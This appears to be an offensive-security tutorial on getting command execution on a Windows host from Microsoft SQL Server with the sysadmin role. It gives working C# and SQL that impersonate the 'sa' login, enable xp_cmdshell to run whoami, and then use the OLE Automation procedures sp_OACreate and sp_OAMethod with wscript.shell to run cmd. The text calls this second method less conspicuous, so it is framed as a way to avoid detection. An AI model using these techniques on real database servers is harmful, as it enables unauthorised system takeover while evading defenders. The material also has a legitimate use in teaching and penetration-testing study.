## Code Execution With _sa_ Role
With sysadmin role membership, it's possible to obtain code execution on the Windows server hosting the SQL database.
The most well-known way of doing this is by using the [_xp_cmdshell_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) stored procedure.

Sysadmin role membership allows us to enable xp_cmdshell using advanced options and the [_sp_configure_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15) stored procedure.
We'll use the sp_configure stored procedure to activate the advanced options and then enable xp_cmdshell.
To activate the advanced options as well as xp_cmdshell, we must remember to update the currently configured values with the [_RECONFIGURE_](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/reconfigure-transact-sql?view=sql-server-ver15) statement.

We edit our c# Application with the following code:
```c#
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = "EXEC xp_cmdshell whoami";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();
```

However, this technique is used very commonly and is not very discrete.
To counter this, we'll use [_sp_OACreate_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-ver15) and [_sp_OAMethod_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql?view=sql-server-ver15) stored procedures to create and execute a new stored procedure based on _Object Linking and Embedding_ (OLE).

With this technique, we can instantiate the Windows Script Host and use the _run_ method.

The _sp_OACreate_ procedure takes 2 arguments:
1. OLE object that we want to instantiate (_wscript.shell_ in our case)
2. Local variable where we want to store it.

The sql statement will be:
```SQL
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
```
(Because _@myshell_ is a local variable, we must stack the SQL queries to ensure it exists when sp_OACreate is invoked.)

The _sp_OAMethod_ procedure takes the following arguments:
1. Name of procedure to execute
2. Method of OLE object(run in our case)
3. Optional output variable
4. Parameters for the invoked method

Before we can execute our new OLE-based procedure, we must ensure that the "OLE Automation Procedures" setting is enabled. Although it is disabled by default, we can change this setting using the sp_configure procedure before creating the stored procedure since we have the sysadmin role.

The c# code application will have the following code:
```C#
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
        String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
        String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";

        SqlCommand command = new SqlCommand(impersonateUser, con);
        SqlDataReader reader = command.ExecuteReader();
        reader.Close();

        command = new SqlCommand(enable_ole, con);
        reader = command.ExecuteReader();
        reader.Close();

        command = new SqlCommand(execCmd, con);
        reader = command.ExecuteReader();
        reader.Close();

        con.Close();
```
